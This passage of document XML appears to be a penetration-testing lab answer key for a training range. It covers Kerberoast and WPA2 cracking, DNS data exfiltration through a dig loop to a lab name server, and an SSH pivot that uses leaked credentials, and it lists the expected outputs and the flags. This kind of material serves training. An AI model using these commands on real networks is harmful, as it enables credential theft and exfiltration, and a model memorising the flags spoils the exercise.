        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The log leaks a cleartext DB credential (reporting / Rep0rting#2024) and carries the audit integrity token (the flag).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>30. Kerberoasting (offline)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>11</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MODULE_ENT_KRB_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Offline (Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Crack the provided TGS-REP ticket offline to recover the service-account password.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>john --format=krb5tgs --wordlist=/usr/share/wordlists/lab-passwords.txt /root/captures/kerberoast.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>john --show --format=krb5tgs /root/captures/kerberoast.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># hashcat works too:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>hashcat -m 13100 /root/captures/kerberoast.txt /usr/share/wordlists/lab-passwords.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Recovers the svc_sql service-account password: Winter2024 (the flag).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The ticket decrypts to a real EncTicketPart, so John/hashcat accept the crack.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Winter2024 (STATIC).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>John caches cracks in ~/.john/john.pot, so a second run says "No password hashes left"; use --show, or rm ~/.john/john.pot to crack fresh.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>31. Data Exfiltration (DNS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>12</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Grading: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>manual</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>DMZ (DNS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Tunnel looted data out inside DNS queries to the lab name server.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>echo 'secret data' | base64</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>for c in $(echo -n &lt;encoded&gt; | fold -w30); do dig +short $c.exfil.pentesttv.local @172.28.10.34; done</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Any label under exfil.pentesttv.local resolves (answer 127.0.0.1, not NXDOMAIN), confirming the channel.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Manual module: a real listener on the authoritative server would reassemble the labels. Mark done.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>For a full automated tunnel, dnscat2 or iodine handle the encoding and reassembly.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>32. Wireless Handshake Cracking</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>13</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MODULE_13_WIFI_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Offline (Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Crack the provided WPA2 four-way handshake offline to recover the Wi-Fi passphrase.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>aircrack-ng -w /usr/share/wordlists/lab-passwords.txt /root/captures/wpa-handshake.pcap</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># reliable fallback if aircrack rejects the pcap framing:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>hashcat -m 22000 /root/captures/wpa-handshake.22000 /usr/share/wordlists/lab-passwords.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SSID is PentestTV-Corp; aircrack prints KEY FOUND [ Baseball1 ].</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The recovered passphrase IS the flag (a Wi-Fi PSK, not a PENTESTTV{...} string).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Baseball1 (STATIC: baked into the shipped capture).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="8A6D1A"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Phase 3: Restricted · Crown Jewels</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>33. Deep Pivot to the Restricted Segment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Chapter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>11</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Grading: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>flag</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag var: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>MODULE_ENT_VAULT_FLAG</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C9D2DA"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   ·   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Zone: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="5B6570"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Restricted</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Use the opsadmin credential to reach the jump host, read its handover notes, then pivot to the vault for the final flag.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Commands (run in Kali)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ssh opsadmin@172.28.20.100                  # password OpsTransit#2024 (from the wiki)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cat ~/handover-notes.txt                    # gives svc_vault / V@ultKeeper2024</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ssh svc_vault@172.28.30.20                  # reachable only from the jump host</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cat ~/loot/vault_flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Expected result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>vault-01 (172.28.30.20) sits on the restricted network, reachable only from jump-01 (172.28.20.100).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>vault_flag.txt is the final flag of the engagement.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">Flag: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>a PENTESTTV{32-hex} value, random per deploy. Validated by the scoreboard; the live value is recorded in flags.generated.env.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:p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